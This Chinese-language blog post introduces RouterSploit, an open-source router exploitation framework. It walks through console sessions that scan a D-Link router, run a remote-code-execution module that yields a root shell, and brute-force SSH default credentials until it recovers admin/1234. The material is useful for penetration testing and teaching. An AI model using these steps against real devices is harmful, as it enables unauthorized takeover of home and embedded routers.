---
title: 路由器漏洞检测及利用框架 RouterSploit
id: 408
comment: false
categories:
  - arm
date: 2016-05-09 22:28:45
tags:
---

RouteSploit框架是一款开源的漏洞检测及利用框架，其针对的对象主要为路由器等嵌入式设备。

<!-- more -->
asciicast

框架功能

RouteSploit框架主要由可用于渗透测试的多个功能模块组件组成，

1、 Scanners：模块功能主要为检查目标设备是否存在可利用的安全漏洞；

2、Creds：模块功能主要针对网络服务的登录认证口令进行检测；

3、Exploits：模块功能主要为识别到目标设备安全漏洞之后，对漏洞进行利用，实现提权等目的。

工具安装

sudo apt-get install python-requests python-paramiko python-netsnmpgit clone https://github.com/reverse-shell/routersploit ./rsf.py
GitHub地址如上命令中所述为：RouteSploit。

操作使用

首先，启动RouteSploit框架，具体如下所示

root@kalidev:~/git/routersploit# ./rsf.py 
 ______            _            _____       _       _ _
 | ___ \          | |          /  ___|     | |     (_) |
 | |_/ /___  _   _| |_ ___ _ __\ `--. _ __ | | ___  _| |_
 |    // _ \| | | | __/ _ \ '__|`--. \ '_ \| |/ _ \| | __|
 | |\ \ (_) | |_| | ||  __/ |  /\__/ / |_) | | (_) | | |_
 \_| \_\___/ \__,_|\__\___|_|  \____/| .__/|_|\___/|_|\__|
                                     | |
     Router Exploitation Framework   |_|

 Dev Team : Marcin Bury (lucyoa) & Mariusz Kupidura (fwkz)
 Codename : Wildest Dreams version  : 1.0.0

rsf >
1、Scanners 模块

scanners模块，具备设备漏洞扫描功能，通过该模块，可快速识别目标设备是否存在可利用的安全漏洞，下面会以一个dlink路由器为例，结合进行操作描述。

（1）选择scanners模块，操作如下，

rsf > use scanners/dlink_scan
rsf (D-Link Scanner) > show options
（2）显示选项

Target options:

   Name       Current settings     Description                                
   ----       ----------------     -----------                                
   target                          Target address e.g. http://192.168.1.1     
   port       80                   Target port
（3）设置目标设备IP

rsf (D-Link Scanner) > set target 192.168.1.1
[+] {'target': '192.168.1.1'}
（4）运行模块，执行情况如下，

rsf (D-Link Scanner) > run
[+] exploits/dlink/dwr_932_info_disclosure is vulnerable
[-] exploits/dlink/dir_300_320_615_auth_bypass is not vulnerable
[-] exploits/dlink/dsl_2750b_info_disclosure is not vulnerable
[-] exploits/dlink/dns_320l_327l_rce is not vulnerable
[-] exploits/dlink/dir_645_password_disclosure is not vulnerable
[-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable
[-] exploits/dlink/dir_300_600_rce is not vulnerable

[+] Device is vulnerable!
 - exploits/dlink/dwr_932_info_disclosure
如上所呈现的结果，目标设备存在dwr_932_info_disclosure漏洞。接下来，我们选择合适的payload进行传递和测试（以下涉及exploits模块功能操作，如需，请再往下查阅），

6.png

2、Exploits 模块

（1）选择Exploits模块，操作如下，

rsf > use exploits/
exploits/2wire/     exploits/asmax/     exploits/asus/      exploits/cisco/     exploits/dlink/     exploits/fortinet/  exploits/juniper/   exploits/linksys/   exploits/multi/     exploits/netgear/
rsf > use exploits/dlink/dir_300_600_rce
rsf (D-LINK DIR-300 & DIR-600 RCE) >
我们也可以使用“tab”键来自动补充输入命令。

（2）显示选项

rsf (D-LINK DIR-300 & DIR-600 RCE) > show options

Target options:

   Name       Current settings     Description                                
   ----       ----------------     -----------                                
   target                          Target address e.g. http://192.168.1.1     
   port       80                   Target Port
设置选项，操作如下，

rsf (D-LINK DIR-300 & DIR-600 RCE) > set target http://192.168.1.1
[+] {'target': 'http://192.168.1.1'}
（3）运行模块

通过使用“run”或“exploit”命令来完成漏洞的利用，

rsf (D-LINK DIR-300 & DIR-600 RCE) > run
[+] Target is vulnerable
[*] Invoking command loop...
cmd > whoami
root
也可检测目标设备是否存在选定的安全漏洞，操作如下，

rsf (D-LINK DIR-300 & DIR-600 RCE) > check
[+] Target is vulnerable
（4）显示具体漏洞信息

通过“show info”命令，显示漏洞信息，包括其存在的设备品牌、型号、漏洞类型及参考来源，具体参考如下，

rsf (D-LINK DIR-300 & DIR-600 RCE) > show info

Name:
D-LINK DIR-300 & DIR-600 RCE

Description:
Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.

Targets:
- D-Link DIR 300
- D-Link DIR 600

Authors:
- Michael Messner <devnull[at]s3cur1ty.de> # vulnerability discovery
- Marcin Bury <marcin.bury[at]reverse-shell.com> # routersploit module

References:
- http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router
- http://www.s3cur1ty.de/home-Network-horror-days
- http://www.s3cur1ty.de/m1adv2013-003
3、 Creds模块

（1）选择模块

此模块相关文件位于 /routesploit/modules/creds/ 目录下，以下为该模块支持检测的服务，

?	ftp 

?	ssh

?	telnet

?	http basic auth

?	http form auth

?	snmp

在检测过程中，可通过两个层面对上述的每个服务进行检测，

默认服务登录口令检测：利用框架提供的各类路由等设备以及服务的默认登录口令字典，通过快速列举的方式，可在较短时间内（几秒钟）验证设备是否仍使用默认登录口令；

暴力破解：利用框架中所提供的特定账户或者账户列表进行字典攻击。其中包含两个参数（登录账户及密码），如框架/routesploit/wordlists目录中字典所示，参数值可以为一个单词（如’admin’），或者是一整个单词列表。

（2）控制台

rsf > use creds/
creds/ftp_bruteforce         creds/http_basic_bruteforce  creds/http_form_bruteforce   creds/snmp_bruteforce        creds/ssh_default            creds/telnet_default         
creds/ftp_default            creds/http_basic_default     creds/http_form_default      creds/ssh_bruteforce         creds/telnet_bruteforce      
rsf > use creds/ssh_default
rsf (SSH Default Creds) >
（3）显示选项

5.png

（4）设置目标设备IP

rsf (SSH Default Creds) > set target 192.168.1.53
[+] {'target': '192.168.1.53'}
（5）运行模块

rsf (SSH Default Creds) > run
[*] Running module...
[*] worker-0 process is starting...
[*] worker-1 process is starting...
[*] worker-2 process is starting...
[*] worker-3 process is starting...
[*] worker-4 process is starting...
[*] worker-5 process is starting...
[*] worker-6 process is starting...
[*] worker-7 process is starting...
[-] worker-4 Authentication failed. Username: '3comcso' Password: 'RIP000'
[-] worker-1 Authentication failed. Username: '1234' Password: '1234'
[-] worker-0 Authentication failed. Username: '1111' Password: '1111'
[-] worker-7 Authentication failed. Username: 'ADVMAIL' Password: 'HP'
[-] worker-3 Authentication failed. Username: '266344' Password: '266344'
[-] worker-2 Authentication failed. Username: '1502' Password: '1502'

(..)

Elapsed time:  38.9181981087 seconds
[+] Credentials found!

Login     Password     
-----     --------     
admin     1234         

rsf (SSH Default Creds) >
介绍内容来自 FreeBuf黑客与极客
